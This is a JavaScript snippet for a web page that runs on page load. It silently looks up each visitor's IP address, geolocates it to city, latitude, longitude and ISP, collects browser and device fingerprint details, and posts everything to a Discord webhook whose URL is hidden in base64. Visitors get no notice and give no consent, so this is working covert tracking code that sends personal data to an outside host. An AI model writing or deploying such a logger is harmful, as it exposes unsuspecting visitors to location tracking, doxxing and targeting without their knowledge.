// Encoded webhook URL
const encodedWebhookURL = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzOTg4NjIzMjMxODkwMjMxNC9HdWZnejd1cTVlU08xQ1NGMEE4X2RNS0ZDNGYtVm05dU5NTGFqdTFScXVneDlWZ05KREtVOFZ4RV9EMVUyRjJTeV90Tg==';
const webhookURL = atob(encodedWebhookURL); // Decoding the URL

// Function to send user details to a Discord webhook as an embed
function sendToDiscord(message) {
    const data = {
        embeds: [{
            title: 'User Action Logged ✅ [NORMAL USER]',
            color: 0xff0000, // Red color
            description: message
        }]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(() => console.log('Data sent to Discord'))
    .catch(error => console.error('Error sending data to Discord:', error));
}

// Log user details on page load
window.addEventListener('load', () => {
    fetch('https://wtfismyip.com/json')
        .then(response => response.json())
        .then(data => {
            const ip = data.YourFuckingIPAddress;
            fetch(`https://uncors.vercel.app/?url=http://ip-api.com/json/${ip}`)
                .then(response => response.json())
                .then(ipData => {
                    const country = ipData.country;
                    const region = ipData.regionName;
                    const city = ipData.city;
                    const latitude = ipData.lat;
                    const longitude = ipData.lon;
                    const isp = ipData.isp;
                    const userAgent = navigator.userAgent;
                    const windowProperties = Object.keys(window);
                    const windowWidth = window.innerWidth;
                    const windowHeight = window.innerHeight;
                    const windowRatio = windowWidth / windowHeight;
                    const screenWidth = screen.width;
                    const screenHeight = screen.height;
                    const screenRatio = screenWidth / screenHeight;
                    const screenPixelRatio = window.devicePixelRatio;
                    const screenDPI = screen.pixelDepth;
                    const screenColorDepth = screen.colorDepth;
                    const screenOrientation = screen.orientation.type;
                    const screenRotation = screen.orientation.angle;
                    const os = navigator.platform;
                    const availableMemory = navigator.deviceMemory;
                    const cpuThreads = navigator.hardwareConcurrency;

                    console.log('IP Address:', ip);
                    console.log('Country:', country);
                    console.log('Region:', region);
                    console.log('City:', city);
                    console.log('Latitude:', latitude);
                    console.log('Longitude:', longitude);
                    console.log('ISP:', isp);
                    console.log('User Agent:', userAgent);
                    console.log('Window Properties:', windowProperties);
                    console.log('Window Width:', windowWidth);
                    console.log('Window Height:', windowHeight);
                    console.log('Window Ratio:', windowRatio);
                    console.log('Screen Width:', screenWidth);
                    console.log('Screen Height:', screenHeight);
                    console.log('Screen Ratio:', screenRatio);
                    console.log('Screen Pixel Ratio:', screenPixelRatio);
                    console.log('Screen DPI:', screenDPI);
                    console.log('Screen Color Depth:', screenColorDepth);
                    console.log('Screen Orientation:', screenOrientation);
                    console.log('Screen Rotation:', screenRotation);
                    console.log('OS:', os);
                    console.log('Available Browser Memory:', availableMemory);
                    console.log('CPU Threads:', cpuThreads);

                    sendToDiscord(`IP Address: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\nUser Agent: ${userAgent}\nWindow Properties: ${windowProperties}\nWindow Width: ${windowWidth}\nWindow Height: ${windowHeight}\nWindow Ratio: ${windowRatio}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nScreen Ratio: ${screenRatio}\nScreen Pixel Ratio: ${screenPixelRatio}\nScreen DPI: ${screenDPI}\nScreen Color Depth: ${screenColorDepth}\nScreen Orientation: ${screenOrientation}\nScreen Rotation: ${screenRotation}\nOS: ${os}\nAvailable Browser Memory: ${availableMemory}\nCPU Threads: ${cpuThreads}`);
                })
                .catch(error => console.error('Error getting IP details:', error));
        })
        .catch(error => console.error('Error getting IP address:', error));
});
